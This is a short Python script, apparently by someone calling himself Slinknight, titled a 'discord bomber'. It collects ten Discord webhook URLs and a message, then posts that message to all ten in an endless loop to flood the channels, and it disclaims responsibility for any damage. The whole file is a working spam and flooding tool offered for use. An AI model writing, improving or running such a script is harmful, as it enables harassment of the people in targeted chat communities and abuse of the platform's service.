import requests
import gratient
import os

os.system("title 𝙎𝙡𝙞𝙣𝙠'𝙨 𝙙𝙞𝙨𝙘𝙤𝙧𝙙 𝙗𝙤𝙢𝙗𝙚𝙧")
os.system("cls")


banner = (gratient.purple("""
**********************************************************************
*  ,_   ___,_,  _, _, ,_    ,_       __   _,  , ,  __   _,,_         *
*  | \,' | (_, /  / \,|_)   | \,    '|_) / \,|\/| '|_) /_,|_)        *
* _|_/  _|_,_)'\_'\_/'| \  _|_/     _|_)'\_/ | `| _|_)'\_'| \        *
*'     '   '     `'   '  `'        '     '   '  `'       `'  `       *
*                                                                    *
*    writen by Slinknight in 2021                                    *
*                                                                    *
**********************************************************************                       
"""))

print("")
print("i'm not responsible for any damage caused")
print("to stop the attack, close the application")
print("")
webhook1 = input("input the 1 Webhook url >> ")
webhook2 = input("input the 2 Webhook url >> ")
webhook3 = input("input the 3 Webhook url >> ")
webhook4 = input("input the 4 Webhook url >> ")
webhook5 = input("input the 5 Webhook url >> ")
webhook6 = input("input the 6 Webhook url >> ")
webhook7 = input("input the 7 Webhook url >> ")
webhook8 = input("input the 8 Webhook url >> ")
webhook9 = input("input the 9 Webhook url >> ")
webhook10 = input("input the 10 Webhook url >> ")
print(" ")
text = input("input text (must be less than 2000 characters) >> ")
print(" ")
attack_start = input("start attack? >> ")

payload = {"content": text}


while 1:   

    response = requests.post(webhook1, data=payload)
    response = requests.post(webhook2, data=payload)
    response = requests.post(webhook3, data=payload)
    response = requests.post(webhook4, data=payload)
    response = requests.post(webhook5, data=payload)
    response = requests.post(webhook6, data=payload)
    response = requests.post(webhook7, data=payload)
    response = requests.post(webhook8, data=payload)
    response = requests.post(webhook9, data=payload)
    response = requests.post(webhook10, data=payload)
